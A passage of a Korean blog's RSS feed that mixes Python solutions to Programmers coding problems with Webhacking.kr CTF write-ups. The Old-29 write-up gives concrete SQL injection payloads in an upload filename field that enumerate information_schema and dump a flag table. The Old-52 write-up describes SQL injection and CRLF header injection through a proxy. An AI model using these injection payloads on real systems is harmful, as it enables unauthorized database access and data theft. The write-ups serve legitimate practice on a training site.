<span class="built_in">len</span>(lost)</span><br></pre></td></tr></table></figure><p>문제를 제대로 이해를 못하여, 조금 시간이 걸린 문제였다.<br><br>나는 잃어버린 학생과 빌려주는 학생의 번호가 중복이 없는지 알았는데, 그것이 아니였다.<br><br>두 리스트는 별개로 각 리스트에 중복되는 번호가 없다는 것이였다.</p><p>그것을 알고나니, 문제를 쉽게 풀 수 있었다.</p><p>각 리스트의 중복값을 차집합을 이용하여 제거하였다.<br><br>이러한 이유는 잃어버린 학생과 빌려주는 학생의 사이즈가 같으면, 굳이 사이즈를 -1 or +1하여 빌리지 않아도 되기 때문이다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> lost == []:</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><p>위 조건문을 통해 두 리스트의 중복값이 없앤 lost 리스트가 비어있다면, 모두 수업에 참석할 수 있으니 n을 그대로 리턴하였다.</p><p>이후, 중복되지 않은 값들은 -1 or +1를 해줘서 reserve 리스트와 중복되면 리스트에서 제거를 해준다.<br><br>그런 다음 lost 리스트의 길이와 n을 빼준다면 수업에 참석할 수 있는 사람의 수를 구할 수 있다.</p><p>그런데 내가 왜 lost 리스트를 깊은 복사를 하여, 사용한 이유는 <code>for i in list</code>로 리스트를 사용할 때 반복문 안에 list의 변화가 일어나면 for문은 그것을 인지하기 때문이다.</p><p>그래서 원하지 않은 결과를 얻을 수 있기 때문이다.</p><p><img src="/images/pasted-554.png"><br>이처럼 for문이 사용하는 list와 내가 제거하는 리스트의 주소가 같기 때문에 원치 않은 결과를 얻었다.<br><br>이 코드는 for문을 이용하여, 리스트 안의 item을 제거하는 코드이다. 그러나 a[0]이 제거가 되고, a는 [2, 3]으로 변경이 되었다. 그럼 다음 순서인 a[1]은 3이 되기 때문에 2는 제거가 되지 않고, 그대로 남게 된다.</p><p>그래서 나는 깊은 복사를 사용하여, 반복문을 돌렸다.</p><p>물론 <strong>깊은 복사를 사용하지 않고도 반복문에 reserve를 사용하여 lost 리스트의 아이템만 제거하는 방법이 있다.</strong></p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/06/01/Programmers-Level-1-%EC%B2%B4%EC%9C%A1%EB%B3%B5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 52 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/01/Webhacking-kr-Old-52-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/01/Webhacking-kr-Old-52-Write-Up/</guid>
      <pubDate>Tue, 01 Jun 2021 03:28:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-52"><a href="#Old-52" class="headerlink" title="Old - 52"></a>Old - 52</h2><p><img src="/images/pasted-545.png"><br>문제 페이지에 들어가보니, admin 페이지로 넘어가는게 미션인 듯하다.</p><p><img src="/images/pasted-546.png"><br><code>here is proxy just for fun</code> 부분의 proxy를 클릭하니, 문제 서버에서 프록시를 해주는 것으로 판단이 된다.</p><p><img src="/images/pasted-547.png"><br>admin페이지로 넘어가니, 로그인을 하라고 해서 일단 내가 알고 있는 guest/guest를 입력해봤다.</p><p><img src="/images/pasted-548.png"><br>아무 소득이 없었다.<br><br>그래서 혹시 쿠키에 뭔가 저장이 됬는지 확인을 해봤는데, 아무것도 없었다.</p><p><img src="/images/pasted-549.png"><br>우연히 SQLi를 시도하다가 안되서 로그인 취소 버튼을 클릭하니, 저런 사이트가 나왔다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;view_source&#x27;</span>]) view_source();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;logout&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;&lt;script&gt;location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>로그아웃 시 login 세션이 빈 세션으로 지정되고, index 페이지로 리다이렉트된다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>])&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;hi <span class="subst">&#123;$_SESSION[&#x27;login&#x27;]&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^172\.17\.0\./&quot;</span>,$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])) <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Only access from virtual IP address&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;You are not admin&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;a href=./?logout=1&gt;[logout]&lt;/a&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>로그인 세션이 있을 경우에 <code>hi 로그인 세션</code>을 출력한다.<br><br>이후에 로그인 세션이 admin이면, 접속한 주소가 <code>172.17.0.x</code>주소이면 Flag를 출력한다.<br>그게 아니라면, admin이 아니라는 문구를 추가적으로 출력한다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">&#x27;login&#x27;</span>])&#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/logout=1/&quot;</span>,$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]))&#123;</span><br><span class="line">    header(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Protected Area&quot;&#x27;</span>);</span><br><span class="line">    header(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($_SERVER[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])&#123;</span><br><span class="line">    $id = $_SERVER[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>];</span><br><span class="line">    $pw = $_SERVER[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>];</span><br><span class="line">    $pw = md5($pw);</span><br><span class="line">    $db = dbconnect();</span><br><span class="line">    $query = <span class="string">&quot;select id from member where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$pw&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">      $_SESSION[<span class="string">&#x27;login&#x27;</span>] = $result[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&quot;&lt;script&gt;location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!$_SESSION[<span class="string">&#x27;login&#x27;</span>])&#123;</span><br><span class="line">    header(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Protected Area&quot;&#x27;</span>);</span><br><span class="line">    header(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Login Fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>로그인 세션이 없다면, id와 pw 파라미터를 통해 쿼리문에 id와 pw을 삽입하여 로그인을 할 수 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/logout=1/&quot;</span>,$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]))&#123;</span><br><span class="line">header(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Protected Area&quot;&#x27;</span>);</span><br><span class="line">  header(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>나는 이러한 코드를 볼 수 있었는데, <code>WWW-Authenticate</code>해더를 볼 수 있었다.<br><br>이는 http 인증을 한다는 것으로 판단이 된다. </p><blockquote><p><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Authentication">HTTP 인증 - HTTP | MDN</a></p></blockquote><p><img src="/images/pasted-550.png"><br><img src="/images/pasted-551.png"><br><img src="/images/pasted-552.png"><br>위와 같이 SQLi를 통해 admin으로 로그인을 할 수 있으며, <code>WWW-Authenticate</code>으로 인증을 하는 것을 알 수 있다.<br><br>해당 Base64는 admin으로 인코딩한 것이다.</p><p>이를 통해 문제 서버의 프록시를 이용하여, admin 페이지에 주요 헤더와 데이터들을 보냈다.<br><br>Request 해더 삽입을 할 때 줄 구분을 위해 CRLF(%0d%0a)를 사용하였다.</p><p><img src="/images/pasted-553.png"><br>Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/01/Webhacking-kr-Old-52-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - [1차] 비밀지도</title>
      <link>https://lrtk-coder.github.io/2021/06/01/Programmers-Level-1-1%EC%B0%A8-%EB%B9%84%EB%B0%80%EC%A7%80%EB%8F%84/</link>
      <guid>https://lrtk-coder.github.io/2021/06/01/Programmers-Level-1-1%EC%B0%A8-%EB%B9%84%EB%B0%80%EC%A7%80%EB%8F%84/</guid>
      <pubDate>Tue, 01 Jun 2021 01:45:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1차-비밀지도&quot;&gt;&lt;a href=&quot;#1차-비밀지도&quot; class=&quot;headerlink&quot; title=&quot;[1차] 비밀지도&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/176</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1차-비밀지도"><a href="#1차-비밀지도" class="headerlink" title="[1차] 비밀지도"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/17681">[1차] 비밀지도</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><h3 id="비밀지도"><a href="#비밀지도" class="headerlink" title="비밀지도"></a>비밀지도</h3><p>네오는 평소 프로도가 비상금을 숨겨놓는 장소를 알려줄 비밀지도를 손에 넣었다. 그런데 이 비밀지도는 숫자로 암호화되어 있어 위치를 확인하기 위해서는 암호를 해독해야 한다. 다행히 지도 암호를 해독할 방법을 적어놓은 메모도 함께 발견했다.</p><ol><li>지도는 한 변의 길이가 n인 정사각형 배열 형태로, 각 칸은 “공백”(“ “) 또는 “벽”(“#”) 두 종류로 이루어져 있다.</li><li>전체 지도는 두 장의 지도를 겹쳐서 얻을 수 있다. 각각 “지도 1”과 “지도 2”라고 하자. 지도 1 또는 지도 2 중 어느 하나라도 벽인 부분은 전체 지도에서도 벽이다. 지도 1과 지도 2에서 모두 공백인 부분은 전체 지도에서도 공백이다.</li><li>“지도 1”과 “지도 2”는 각각 정수 배열로 암호화되어 있다.</li><li>암호화된 배열은 지도의 각 가로줄에서 벽 부분을 1, 공백 부분을 0으로 부호화했을 때 얻어지는 이진수에 해당하는 값의 배열이다.</li></ol><p><img src="/images/pasted-544.png"></p><p>네오가 프로도의 비상금을 손에 넣을 수 있도록, 비밀지도의 암호를 해독하는 작업을 도와줄 프로그램을 작성하라.</p><h3 id="입력-형식"><a href="#입력-형식" class="headerlink" title="입력 형식"></a>입력 형식</h3><p>입력으로 지도의 한 변 크기 n 과 2개의 정수 배열 arr1, arr2가 들어온다.</p><ul><li>1 ≦ n ≦ 16</li><li>arr1, arr2는 길이 n인 정수 배열로 주어진다.</li><li>정수 배열의 각 원소 x를 이진수로 변환했을 때의 길이는 n 이하이다. 즉, 0 ≦ x ≦ 2n - 1을 만족한다.</li></ul><h3 id="출력-형식"><a href="#출력-형식" class="headerlink" title="출력 형식"></a>출력 형식</h3><p>원래의 비밀지도를 해독하여 ‘#’, 공백으로 구성된 문자열 배열로 출력하라.</p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toBin</span>(<span class="params">arr, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> arr]</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n, arr1, arr2</span>):</span></span><br><span class="line">    arr1 = toBin(arr1, n)</span><br><span class="line">    arr2 = toBin(arr2, n)</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> [<span class="built_in">str</span>(<span class="built_in">int</span>(i) + <span class="built_in">int</span>(j)) <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(arr1, arr2)]:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; n:</span><br><span class="line">            data = <span class="string">&#x27;0&#x27;</span> * (n - <span class="built_in">len</span>(data)) + data</span><br><span class="line">        result.append(data.replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;#&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;#&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>나는 10진수 - 2진수 - 문자열로 변환시켜서 작업을 했다.<br><br>그러다 보니, 뭔가 깔끔하지 않은 코드가 나왔다.</p><h3 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n, arr1, arr2</span>):</span></span><br><span class="line">    answer = []</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(arr1,arr2):</span><br><span class="line">        a12 = <span class="built_in">str</span>(<span class="built_in">bin</span>(i|j)[<span class="number">2</span>:])</span><br><span class="line">        a12=a12.rjust(n,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        a12=a12.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        a12=a12.replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        answer.append(a12)</span><br><span class="line">    <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure><p>or 연산을 통해 지도를 합칠 수 있었고, rjust 함수를 통해 지도의 크키를 맞출 수 있었다.<br><br>방법1에선 <code>&#39;0&#39; * (n - len(data)) + data</code>를 함으로 맞출 수 있었는데, rjust 함수를 통해 더욱 직관적으로 변경할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/01/Programmers-Level-1-1%EC%B0%A8-%EB%B9%84%EB%B0%80%EC%A7%80%EB%8F%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 29 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/31/Webhacking-kr-Old-29-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/31/Webhacking-kr-Old-29-Write-Up/</guid>
      <pubDate>Mon, 31 May 2021 00:06:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-29"><a href="#Old-29" class="headerlink" title="Old - 29"></a>Old - 29</h2><p><img src="/images/pasted-533.png"><br>파일을 업로드하는 페이지가 나왔다.<br><br>맨위에 Flag는 다른 테이블에 있다고 하니, 아마 SQLi를 통해 다른 테이블을 알아내는 문제로 추측된다.</p><p><img src="/images/pasted-534.png"><br>몇 번 업로드를 하니, 대충 어떻게 업로드가 되는지 알 수 있었다.<br></p><p><img src="/images/pasted-535.png"><br>일단 공격백터로 filename을 사용할 수 있는지 알아보기 위해 ‘를 넣어서 서버로 보냈다.<br><br>그 결과 쿼리 에러가 발생되었다.</p><p>filename의 값을 insult 쿼리에 삽입하여, 데이터를 저장하는 것으로 추측되는데 문제는 filename의 위치를 알아내야한다.<br><br><code>INSERT INTO 테이블명 VALUES(값1, 값2, 값3);</code> 여기서 filename의 위치가 값1인지 값3인지를 정확하게 모른다는 것이다.<br></p><p><img src="/images/pasted-536.png"><br>그래서 나는 일단 값3에 위치한다고 생각하고, <code>INSERT INTO 테이블명 VALUES(값1, 값2, filename);#);</code>으로 만들어줘서 해당 위치가 맞는지 확인을 하였다.<br><br>기대와 다르게 다른 위치인 듯하여, 경우의 수를 모두 넣어서 테스트를 진행하였다.</p><p><img src="/images/pasted-537.png"><br><code>3&#39;, &#39;123&#39;, My IP);#</code>를 서버로 보내니, 해당 값이 저장되어 출력되었다.<br><br>이로써 <code>INSERT INTO 테이블명 VALUES(filename, time, ip);</code>로 이루어져있다는 것을 알 수 있었다.</p><p>전에 풀이하였던 32번 문제에 사용한 방법대로, VALUES 절에 여러 값들을 넣어서 내가 원하는 값도 같이 저장되도록 하였다.</p><p><img src="/images/pasted-538.png"><br>여기서 굳이 값을 추가하는 이유는 filename은 INSULT 문에서 작음 따음표로 묶어져 있기 때문에 <code>database()</code>를 넣어도 문자열로 인식되어 실행이 되지 않는다.</p><p><img src="/images/pasted-539.png"><br><code>1&#39;, &#39;123&#39;, My IP),(database(), &#39;123&#39;, My IP);#</code><br>database()을 사용하여 해당 테이블이 어떤 database에 존재하는지 확인하였다.</p><p><img src="/images/pasted-540.png" alt="1&#39;, &#39;123&#39;, My IP),((SELECT count(table_name) from information_schema.tables where table_schema=&#39;chall29&#39;), &#39;123&#39;, My IP);#"><br>스키마으로 테이블의 개수를 확인하였다. 이렇게 한 이유는 테이블이 여러 개가 있으면, Limit를 이용하여 하나씩 출력을 해야하기 때문인데 총 몇번을 시도를 하면 되는지 확인하기 위해서다.</p><p><img src="/images/pasted-541.png" alt="1&#39;, &#39;123&#39;, My IP),((SELECT table_name from information_schema.tables where table_schema=&#39;chall29&#39; LIMIT 0, 1), &#39;123&#39;, My IP);#"><br>2개 중 첫번째 테이블명을 확인하니, <code>files</code>가 나왔다. 아마 파일을 업로드하면 저 테이블에 저장이 될 것으로 판단된다.</p><p><img src="/images/pasted-542.png" alt="1&#39;, &#39;123&#39;, My IP),((SELECT table_name from information_schema.tables where table_schema=&#39;chall29&#39; LIMIT 1, 2), &#39;123&#39;, My IP);#"><br>두번째 테이블명을 출력하니, 확실히 Flag가 저장되어 있을 것 같다.</p><p><img src="/images/pasted-543.png" alt="1&#39;, &#39;123&#39;, My IP),((SELECT * from flag_congratz), &#39;123&#39;, My IP);#"><br>flag_congratz 테이블 안에 Flag 말고는 다른 데이터는 존재하지 않을 거 같아서 모두 출력하였더니, 운 좋게 빙고였다.<br><br>이렇게 Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Secuerity/">Secuerity</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Secuerity/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Secuerity/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/31/Webhacking-kr-Old-29-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Lever 1 - 예산</title>
      <link>https://lrtk-coder.github.io/2021/05/30/Programmers-Lever-1-%EC%98%88%EC%82%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/30/Programmers-Lever-1-%EC%98%88%EC%82%B0/</guid>
      <pubDate>Sun, 30 May 2021 23:34:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;예산&quot;&gt;&lt;a href=&quot;#예산&quot; class=&quot;headerlink&quot; title=&quot;예산&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12982&quot;&gt;예산&lt;/a&gt;&lt;/h1&gt;&lt;h</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="예산"><a href="#예산" class="headerlink" title="예산"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12982">예산</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>S사에서는 각 부서에 필요한 물품을 지원해 주기 위해 부서별로 물품을 구매하는데 필요한 금액을 조사했습니다. 그러나, 전체 예산이 정해져 있기 때문에 모든 부서의 물품을 구매해 줄 수는 없습니다. 그래서 최대한 많은 부서의 물품을 구매해 줄 수 있도록 하려고 합니다.</p><p>물품을 구매해 줄 때는 각 부서가 신청한 금액만큼을 모두 지원해 줘야 합니다. 예를 들어 1,000원을 신청한 부서에는 정확히 1,000원을 지원해야 하며, 1,000원보다 적은 금액을 지원해 줄 수는 없습니다.</p><p>부서별로 신청한 금액이 들어있는 배열 d와 예산 budget이 매개변수로 주어질 때, 최대 몇 개의 부서에 물품을 지원할 수 있는지 return 하도록 solution 함수를 완성해주세요.</p><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><ul><li>d는 부서별로 신청한 금액이 들어있는 배열이며, 길이(전체 부서의 개수)는 1 이상 100 이하입니다.</li><li>d의 각 원소는 부서별로 신청한 금액을 나타내며, 부서별 신청 금액은 1 이상 100,000 이하의 자연수입니다.</li><li>budget은 예산을 나타내며, 1 이상 10,000,000 이하의 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">d:<span class="built_in">list</span>, budget:<span class="built_in">int</span></span>):</span></span><br><span class="line">    d = <span class="built_in">sorted</span>(d)</span><br><span class="line">    </span><br><span class="line">    count, total = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        <span class="keyword">if</span> total+i &gt; budget:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        total += i</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/30/Programmers-Lever-1-%EC%98%88%EC%82%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 34 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/30/Webhacking-kr-Old-34Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/30/Webhacking-kr-Old-34Write-Up/</guid>
      <pubDate>Sun, 30 May 2021 12:11:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
